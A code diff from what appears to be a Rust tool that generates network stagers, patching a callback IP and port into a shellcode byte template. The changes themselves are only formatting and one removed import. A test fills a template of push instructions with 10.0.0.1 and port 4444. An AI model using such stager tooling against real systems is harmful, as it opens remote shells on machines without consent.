@@ -85,11 +85,15 @@ pub fn generate_stager(lhost: &str, lport: u16, template: &[u8]) -> Vec<u8> {
 fn ip_to_bytes(ip: &str) -> std::io::Result<Vec<u8>> {
     let parts: Vec<&str> = ip.split('.').collect();
     if parts.len() != 4 {
-        return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, "Invalid IP"));
+        return Err(std::io::Error::new(
+            std::io::ErrorKind::InvalidInput,
+            "Invalid IP",
+        ));
     }
     let mut bytes = Vec::with_capacity(4);
     for part in parts {
-        let byte: u8 = part.parse()
+        let byte: u8 = part
+            .parse()
             .map_err(|_| std::io::Error::new(std::io::ErrorKind::InvalidInput, "Invalid octet"))?;
         bytes.push(byte);
     }
@@ -134,7 +138,6 @@ pub fn test_stager_connection(host: &str, port: u16) -> std::io::Result<Vec<u8>>
 #[cfg(test)]
 mod tests {
     use super::*;
-    use std::net::TcpListener;
     use std::thread;
     use std::time::Duration;
 
@@ -162,7 +165,7 @@ mod tests {
     fn test_generate_stager() {
         let template = vec![
             0x68, 0x7f, 0x7f, 0x7f, 0x7f, // push dword IP
-            0x66, 0x68, 0x7e, 0x7e,       // push word port
+            0x66, 0x68, 0x7e, 0x7e, // push word port
         ];
 
         let stager = generate_stager("10.0.0.1", 4444, &template);
